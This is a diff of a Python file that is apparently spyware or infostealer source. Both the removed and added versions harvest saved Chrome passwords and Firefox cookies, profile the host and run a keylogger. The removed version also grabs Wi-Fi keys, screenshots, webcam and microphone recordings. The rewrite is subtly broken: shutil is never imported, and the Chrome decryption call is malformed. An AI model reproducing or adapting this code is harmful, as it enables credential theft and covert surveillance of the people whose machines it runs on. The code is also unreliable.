@@ -1,460 +1,275 @@
 import os
 import sys
 import json
-import sqlite3
 import base64
-import win32crypt
-import shutil
-import cv2
-import pyautogui
-import sounddevice
-import browser_cookie3
-from PIL import ImageGrab
-from Crypto.Cipher import AES
+import sqlite3
+import platform
+import threading
+import ctypes
+from typing import Dict, List, Optional
 from datetime import datetime
 from pathlib import Path
-import psutil
-import pythoncom
-import win32com.client
-import win32api
-import win32con
-import win32process
-from pynput import keyboard
-import threading
-import wave
-import numpy as np
-from typing import Dict, List, Optional, Union
-import platform
 import logging
-from concurrent.futures import ThreadPoolExecutor
+import time
 
-class BrowserManager:
+class NativeBrowserManager:
     def __init__(self):
-        self.supported_browsers = {
-            'chrome': self._get_chrome_data,
-            'firefox': self._get_firefox_data,
-            'edge': self._get_edge_data,
-            'brave': self._get_brave_data,
-            'opera': self._get_opera_data
-        }
+        self.platform = platform.system().lower()
         
-    def collect_all(self) -> Dict[str, Dict]:
-        """Collect data from all supported browsers"""
-        results = {}
-        with ThreadPoolExecutor(max_workers=len(self.supported_browsers)) as executor:
-            future_to_browser = {
-                executor.submit(func): name 
-                for name, func in self.supported_browsers.items()
-            }
-            for future in future_to_browser:
-                name = future_to_browser[future]
-                try:
-                    results[name] = future.result()
-                except Exception as e:
-                    results[name] = {'error': str(e)}
-        return results
+    def _get_chrome_path(self) -> str:
+        """Get Chrome data path based on OS"""
+        if self.platform == 'windows':
+            return os.path.join(os.getenv('LOCALAPPDATA'),
+                'Google\\Chrome\\User Data\\Default')
+        elif self.platform == 'linux':
+            return os.path.expanduser('~/.config/google-chrome/Default')
+        return ''
         
-    def _get_chrome_data(self) -> Dict:
-        """Get Chrome browser data"""
-        return {
-            'passwords': self._get_chrome_passwords(),
-            'cookies': self._get_chrome_cookies(),
-            'history': self._get_chrome_history(),
-            'bookmarks': self._get_chrome_bookmarks()
-        }
-        
-    def _get_firefox_data(self) -> Dict:
-        """Get Firefox browser data"""
-        return {
-            'passwords': self._get_firefox_passwords(),
-            'cookies': self._get_firefox_cookies(),
-            'history': self._get_firefox_history(),
-            'bookmarks': self._get_firefox_bookmarks()
-        }
-        
-    # Similar methods for other browsers...
-
-class MediaManager:
-    def __init__(self):
-        self.screen_recorder = None
-        self.audio_recorder = None
-        self.webcam_recorder = None
-        
-    def start_screen_recording(self, duration: int = None):
-        """Start screen recording"""
-        def record():
-            frames = []
-            start_time = datetime.now()
-            while not duration or (datetime.now() - start_time).seconds < duration:
-                frame = pyautogui.screenshot()
-                frames.append(np.array(frame))
-            return frames
-            
-        self.screen_recorder = threading.Thread(target=record)
-        self.screen_recorder.start()
-        
-    def start_audio_recording(self, duration: int = None):
-        """Start audio recording"""
-        def record():
-            fs = 44100
-            channels = 2
-            recording = sounddevice.rec(
-                int(duration * fs) if duration else None,
-                samplerate=fs,
-                channels=channels
+    def _decrypt_windows(self, encrypted: bytes, key: bytes = None) -> str:
+        """Decrypt using Windows DPAPI"""
+        try:
+            return ctypes.windll.crypt32.CryptUnprotectData(
+                encrypted, None, None, None, None, 0, None
             )
-            return recording
-            
-        self.audio_recorder = threading.Thread(target=record)
-        self.audio_recorder.start()
-        
-    def start_webcam_recording(self, duration: int = None):
-        """Start webcam recording"""
-        def record():
-            cap = cv2.VideoCapture(0)
-            frames = []
-            start_time = datetime.now()
-            while not duration or (datetime.now() - start_time).seconds < duration:
-                ret, frame = cap.read()
-                if ret:
-                    frames.append(frame)
-            cap.release()
-            return frames
-            
-        self.webcam_recorder = threading.Thread(target=record)
-        self.webcam_recorder.start()
-        
-    def stop_all_recordings(self) -> Dict[str, bytes]:
-        """Stop all recordings and return the data"""
-        results = {}
-        
-        if self.screen_recorder:
-            self.screen_recorder.join()
-            results['screen'] = self._save_video(self.screen_recorder.frames)
-            
-        if self.audio_recorder:
-            self.audio_recorder.join()
-            results['audio'] = self._save_audio(self.audio_recorder.recording)
-            
-        if self.webcam_recorder:
-            self.webcam_recorder.join()
-            results['webcam'] = self._save_video(self.webcam_recorder.frames)
-            
-        return results
-        
-    def _save_video(self, frames: List[np.ndarray]) -> bytes:
-        """Save frames as video"""
-        temp_path = os.path.join(os.getenv('TEMP'), f'vid_{datetime.now().strftime("%Y%m%d_%H%M%S")}.mp4')
-        height, width = frames[0].shape[:2]
-        
-        writer = cv2.VideoWriter(
-            temp_path,
-            cv2.VideoWriter_fourcc(*'mp4v'),
-            30,
-            (width, height)
-        )
-        
-        for frame in frames:
-            writer.write(frame)
-        writer.release()
-        
-        with open(temp_path, 'rb') as f:
-            data = f.read()
-        os.remove(temp_path)
-        return data
-        
-    def _save_audio(self, recording: np.ndarray) -> bytes:
-        """Save audio recording"""
-        temp_path = os.path.join(os.getenv('TEMP'), f'audio_{datetime.now().strftime("%Y%m%d_%H%M%S")}.wav')
-        
-        with wave.open(temp_path, 'wb') as wf:
-            wf.setnchannels(2)
-            wf.setsampwidth(2)
-            wf.setframerate(44100)
-            wf.writeframes(recording.tobytes())
-            
-        with open(temp_path, 'rb') as f:
-            data = f.read()
-        os.remove(temp_path)
-        return data
-
-class SystemInfoCollector:
-    def __init__(self):
-        self.wmi = None
-        try:
-            import wmi
-            self.wmi = wmi.WMI()
         except:
-            pass
+            return None
             
-    def get_detailed_info(self) -> Dict:
-        """Get detailed system information"""
-        return {
-            'system': self._get_system_info(),
-            'hardware': self._get_hardware_info(),
-            'software': self._get_software_info(),
-            'network': self._get_network_info(),
-            'security': self._get_security_info()
-        }
-        
-    def _get_system_info(self) -> Dict:
-        """Get basic system information"""
-        return {
-            'os': {
-                'name': os.name,
-                'platform': sys.platform,
-                'version': platform.version(),
-                'machine': platform.machine(),
-                'processor': platform.processor(),
-                'architecture': platform.architecture()
-            },
-            'user': {
-                'username': os.getenv('USERNAME'),
-                'hostname': platform.node(),
-                'domain': os.getenv('USERDOMAIN')
-            }
-        }
-        
-    def _get_hardware_info(self) -> Dict:
-        """Get hardware information"""
-        info = {
-            'cpu': {
-                'cores': psutil.cpu_count(),
-                'usage': psutil.cpu_percent(interval=1, percpu=True)
-            },
-            'memory': dict(psutil.virtual_memory()._asdict()),
-            'disk': {
-                drive: dict(psutil.disk_usage(drive)._asdict())
-                for drive in self._get_drives()
-            }
-        }
-        
-        if self.wmi:
-            try:
-                info['gpu'] = [{
-                    'name': gpu.Name,
-                    'driver_version': gpu.DriverVersion
-                } for gpu in self.wmi.Win32_VideoController()]
-            except:
-                pass
-                
-        return info
-        
-    def _get_drives(self) -> List[str]:
-        """Get all available drives"""
-        if os.name == 'nt':
-            drives = []
-            bitmask = win32api.GetLogicalDrives()
-            for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
-                if bitmask & 1:
-                    drives.append(f'{letter}:')
-                bitmask >>= 1
-            return drives
-        return ['/']
-
-class Collector:
-    def __init__(self):
-        self.browser_manager = BrowserManager()
-        self.media_manager = MediaManager()
-        self.system_info = SystemInfoCollector()
-        self.keylogger_active = False
-        self.keystrokes = []
-        
-    def collect_all(self, include_media: bool = False) -> Dict:
-        """Collect all available data"""
-        data = {
-            'timestamp': datetime.now().isoformat(),
-            'system_info': self.system_info.get_detailed_info(),
-            'browser_data': self.browser_manager.collect_all(),
-            'wifi': self.get_wifi_passwords(),
-            'screenshot': self.capture_screen()
-        }
-        
-        if include_media:
-            data['media'] = {
-                'webcam': self.capture_webcam(),
-                'audio': self.capture_audio(duration=5)
-            }
-            
-        return data
-        
-    def start_monitoring(self, duration: int = None):
-        """Start monitoring all available sources"""
-        self.start_keylogger()
-        self.media_manager.start_screen_recording(duration)
-        self.media_manager.start_audio_recording(duration)
-        self.media_manager.start_webcam_recording(duration)
-        
-    def stop_monitoring(self) -> Dict:
-        """Stop monitoring and return collected data"""
-        return {
-            'keystrokes': self.stop_keylogger(),
-            'media': self.media_manager.stop_all_recordings()
-        }
-        
-    def get_wifi_passwords(self):
+    def _get_chrome_passwords(self) -> List[Dict]:
+        """Get Chrome passwords using native methods"""
         try:
-            pythoncom.CoInitialize()
+            path = os.path.join(self._get_chrome_path(), 'Login Data')
+            if not os.path.exists(path):
+                return []
+                
+            # Copy DB to temp file to avoid lock
+            temp_path = os.path.join(os.getenv('TEMP'), 'chrome_pwd.db')
+            shutil.copy2(path, temp_path)
+            
             passwords = []
-            
-            # Get wireless interface
-            objWMI = win32com.client.Dispatch("WbemScripting.SWbemLocator")
-            objSWbemServices = objWMI.ConnectServer(".", "root\\wlan")
-            
-            # Get profiles
-            profiles = objSWbemServices.ExecQuery("SELECT * FROM MSNdis_80211_ServiceSetIdentifier")
-            
-            for profile in profiles:
-                try:
-                    ssid = profile.Ssid
-                    # Get password using netsh
-                    cmd = f'netsh wlan show profile name="{ssid}" key=clear'
-                    result = os.popen(cmd).read()
-                    
-                    if "Key Content" in result:
-                        password = result.split("Key Content")[1].split("\n")[0].strip()
+            try:
+                conn = sqlite3.connect(temp_path)
+                cursor = conn.cursor()
+                cursor.execute('''
+                    SELECT origin_url, username_value, password_value 
+                    FROM logins
+                ''')
+                
+                for url, username, encrypted_pwd in cursor.fetchall():
+                    if self.platform == 'windows':
+                        pwd = self._decrypt_windows(encrypted_pwd)
+                    else:
+                        pwd = self._decrypt_linux(encrypted_pwd)
+                        
+                    if pwd:
                         passwords.append({
-                            'ssid': ssid,
-                            'password': password
+                            'url': url,
+                            'username': username,
+                            'password': pwd
                         })
+                        
+                conn.close()
+            finally:
+                try:
+                    os.remove(temp_path)
                 except:
-                    continue
+                    pass
                     
             return passwords
         except:
             return []
             
-    def capture_screen(self):
+    def _decrypt_linux(self, encrypted: bytes) -> str:
+        """Decrypt using Linux methods"""
+        # TO DO: implement Linux decryption
+        return None
+        
+    def _get_firefox_passwords(self) -> List[Dict]:
+        """Get Firefox passwords using native methods"""
         try:
-            screenshot = ImageGrab.grab()
-            temp_path = os.path.join(os.getenv('TEMP'),
-                                   f'screen_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
-            screenshot.save(temp_path)
-            
-            with open(temp_path, 'rb') as f:
-                image_data = base64.b64encode(f.read()).decode()
+            path = os.path.expanduser('~/.mozilla/firefox/*.default-release/cookies.sqlite')
+            if not os.path.exists(path):
+                return []
                 
-            os.remove(temp_path)
-            return image_data
-        except:
-            return None
+            # Copy DB to temp file to avoid lock
+            temp_path = os.path.join(os.getenv('TEMP'), 'firefox_pwd.db')
+            shutil.copy2(path, temp_path)
             
-    def capture_webcam(self):
-        try:
-            cap = cv2.VideoCapture(0)
-            ret, frame = cap.read()
-            cap.release()
-            
-            if ret:
-                temp_path = os.path.join(os.getenv('TEMP'),
-                                       f'webcam_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
-                cv2.imwrite(temp_path, frame)
+            passwords = []
+            try:
+                conn = sqlite3.connect(temp_path)
+                cursor = conn.cursor()
+                cursor.execute('''
+                    SELECT host, name, value 
+                    FROM moz_cookies
+                ''')
                 
-                with open(temp_path, 'rb') as f:
-                    image_data = base64.b64encode(f.read()).decode()
+                for host, name, value in cursor.fetchall():
+                    passwords.append({
+                        'host': host,
+                        'name': name,
+                        'value': value
+                    })
                     
-                os.remove(temp_path)
-                return image_data
-        except:
-            return None
-            
-    def capture_audio(self, duration: int = None):
-        try:
-            fs = 44100
-            channels = 2
-            recording = sounddevice.rec(
-                int(duration * fs) if duration else None,
-                samplerate=fs,
-                channels=channels
-            )
-            return self.media_manager._save_audio(recording)
-        except:
-            return None
-            
-    def start_keylogger(self):
-        if not self.keylogger_active:
-            self.keylogger_active = True
-            
-            def on_press(key):
-                if self.keylogger_active:
-                    try:
-                        self.keystrokes.append(str(key.char))
-                    except AttributeError:
-                        self.keystrokes.append(str(key))
-                        
-            self.listener = keyboard.Listener(on_press=on_press)
-            self.listener.start()
-            
-    def stop_keylogger(self):
-        self.keylogger_active = False
-        if hasattr(self, 'listener'):
-            self.listener.stop()
-        keystrokes = ''.join(self.keystrokes)
-        self.keystrokes = []
-        return keystrokes
-        
-    def get_system_info(self):
-        info = {
-            'os': os.name,
-            'platform': sys.platform,
-            'machine': platform.machine(),
-            'processor': platform.processor(),
-            'hostname': platform.node(),
-            'username': os.getenv('USERNAME'),
-            'memory': dict(psutil.virtual_memory()._asdict()),
-            'disk': dict(psutil.disk_usage('/')._asdict()),
-            'network': [dict(nic._asdict()) for nic in psutil.net_if_addrs().values()],
-            'processes': [p.name() for p in psutil.process_iter()]
-        }
-        return info
-        
-    def get_browser_cookies(self):
-        cookies = {}
-        try:
-            cookies['chrome'] = list(browser_cookie3.chrome())
-        except:
-            pass
-            
-        try:
-            cookies['firefox'] = list(browser_cookie3.firefox())
-        except:
-            pass
-            
-        return cookies
-        
-    def get_installed_software(self):
-        try:
-            pythoncom.CoInitialize()
-            software_list = []
-            
-            # Windows Registry paths
-            paths = [
-                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
-                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
-            ]
-            
-            for path in paths:
+                conn.close()
+            finally:
                 try:
-                    aReg = win32api.RegConnectRegistry(None, win32con.HKEY_LOCAL_MACHINE)
-                    aKey = win32api.RegOpenKey(aReg, path, 0, win32con.KEY_READ)
-                    
-                    for i in range(win32api.RegQueryInfoKey(aKey)[0]):
-                        try:
-                            keyname = win32api.RegEnumKey(aKey, i)
-                            subkey = win32api.RegOpenKey(aKey, keyname)
-                            displayName = win32api.RegQueryValueEx(subkey, "DisplayName")[0]
-                            
-                            software_list.append({
-                                'name': displayName,
-                                'version': win32api.RegQueryValueEx(subkey, "DisplayVersion")[0],
-                                'publisher': win32api.RegQueryValueEx(subkey, "Publisher")[0],
-                                'install_date': win32api.RegQueryValueEx(subkey, "InstallDate")[0]
-                            })
-                        except:
-                            continue
+                    os.remove(temp_path)
                 except:
-                    continue
+                    pass
                     
-            return software_list
+            return passwords
         except:
             return []
+            
+class SystemCollector:
+    def __init__(self):
+        self.platform = platform.system().lower()
+        
+    def get_system_info(self) -> Dict:
+        """Get system information using native APIs"""
+        info = {
+            'platform': platform.system(),
+            'hostname': platform.node(),
+            'release': platform.release(),
+            'version': platform.version(),
+            'machine': platform.machine(),
+            'processor': platform.processor(),
+            'username': os.getenv('USERNAME') or os.getenv('USER'),
+            'home': os.path.expanduser('~')
+        }
+        
+        # Windows-specific info
+        if self.platform == 'windows':
+            try:
+                info.update(self._get_windows_info())
+            except:
+                pass
+                
+        # Linux-specific info
+        elif self.platform == 'linux':
+            try:
+                info.update(self._get_linux_info())
+            except:
+                pass
+                
+        return info
+        
+    def _get_windows_info(self) -> Dict:
+        """Get Windows-specific information"""
+        info = {}
+        try:
+            # Get Windows product key
+            key = ctypes.create_string_buffer(255)
+            ctypes.windll.kernel32.GetWindowsDirectoryA(key, 255)
+            info['windows_dir'] = key.value.decode()
+            
+            # Get system metrics
+            info['screen_width'] = ctypes.windll.user32.GetSystemMetrics(0)
+            info['screen_height'] = ctypes.windll.user32.GetSystemMetrics(1)
+            
+            # Get system power info
+            class SYSTEM_POWER_STATUS(ctypes.Structure):
+                _fields_ = [
+                    ('ACLineStatus', ctypes.c_byte),
+                    ('BatteryFlag', ctypes.c_byte),
+                    ('BatteryLifePercent', ctypes.c_byte),
+                    ('Reserved1', ctypes.c_byte),
+                    ('BatteryLifeTime', ctypes.c_ulong),
+                    ('BatteryFullLifeTime', ctypes.c_ulong)
+                ]
+                
+            status = SYSTEM_POWER_STATUS()
+            ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(status))
+            info['battery_percent'] = status.BatteryLifePercent
+            
+        except:
+            pass
+            
+        return info
+        
+    def _get_linux_info(self) -> Dict:
+        """Get Linux-specific information"""
+        info = {}
+        try:
+            # Get distribution info
+            with open('/etc/os-release') as f:
+                lines = f.readlines()
+                for line in lines:
+                    if line.startswith('PRETTY_NAME='):
+                        info['distro'] = line.split('=')[1].strip().strip('"')
+                        break
+                        
+            # Get CPU info
+            with open('/proc/cpuinfo') as f:
+                info['cpu_info'] = f.read()
+                
+            # Get memory info
+            with open('/proc/meminfo') as f:
+                info['mem_info'] = f.read()
+                
+        except:
+            pass
+            
+        return info
+        
+class Keylogger:
+    def __init__(self):
+        self.log = []
+        self.active = False
+        self.thread = None
+        
+    def start(self):
+        """Start keylogger using native APIs"""
+        if self.active:
+            return
+            
+        self.active = True
+        self.thread = threading.Thread(target=self._windows_keylogger if platform.system().lower() == 'windows' else self._linux_keylogger)
+        self.thread.daemon = True
+        self.thread.start()
+        
+    def stop(self) -> List[str]:
+        """Stop keylogger and return captured keystrokes"""
+        self.active = False
+        if self.thread:
+            self.thread.join()
+        return self.log
+        
+    def _windows_keylogger(self):
+        """Windows native keylogger"""
+        user32 = ctypes.windll.user32
+        
+        while self.active:
+            for i in range(1, 256):
+                if user32.GetAsyncKeyState(i) & 0x1:
+                    char = chr(i)
+                    self.log.append(char)
+            time.sleep(0.01)
+            
+    def _linux_keylogger(self):
+        """Linux native keylogger"""
+        # TO DO: implement Linux keylogger
+        pass
+        
+class Collector:
+    def __init__(self):
+        self.browser = NativeBrowserManager()
+        self.system = SystemCollector()
+        self.keylogger = Keylogger()
+        
+    def collect_all(self) -> Dict:
+        """Collect all available data"""
+        return {
+            'timestamp': datetime.now().isoformat(),
+            'system_info': self.system.get_system_info(),
+            'chrome_passwords': self.browser._get_chrome_passwords(),
+            'firefox_passwords': self.browser._get_firefox_passwords()
+        }
+        
+    def start_keylogger(self):
+        """Start keylogging"""
+        self.keylogger.start()
+        
+    def stop_keylogger(self) -> List[str]:
+        """Stop keylogging and get results"""
+        return self.keylogger.stop()
